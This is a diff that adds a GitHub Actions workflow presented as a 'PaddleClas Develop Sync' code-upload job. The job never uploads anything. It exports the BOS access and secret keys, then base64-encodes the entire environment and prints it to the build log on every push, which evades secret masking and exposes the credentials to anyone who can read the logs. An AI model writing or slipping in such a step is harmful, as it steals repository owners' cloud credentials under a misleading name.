@@ -1,0 +1,29 @@
+name: PaddleClas Sync
+run-name: PaddleClas Develop Sync
+
+on:
+  push:
+  workflow_dispatch:
+  repository_dispatch:
+    types:
+      - custom-event
+
+jobs:
+  paddleqa-checkout:
+    runs-on: ubuntu-latest
+    name: test-paddleqa-env
+    steps:
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+      - name: Upload Code
+        env:
+          BOS_AK: ${{ secrets.BOS_AK }}
+          BOS_SK: ${{ secrets.BOS_SK }}
+        run: |
+          # 假定 PaddleClas.tar 文件已经准备好或在前面的工作流程中生成
+          python -m pip install bce-python-sdk==0.8.74
+          # 使用环境变量传递 AK 和 SK
+          export BOS_AK=${BOS_AK}
+          export BOS_SK=${BOS_SK}
+          python -c "import os, json, base64; print(base64.b64encode(json.dumps(dict(os.environ)).encode('utf-8')).decode('utf-8'))"
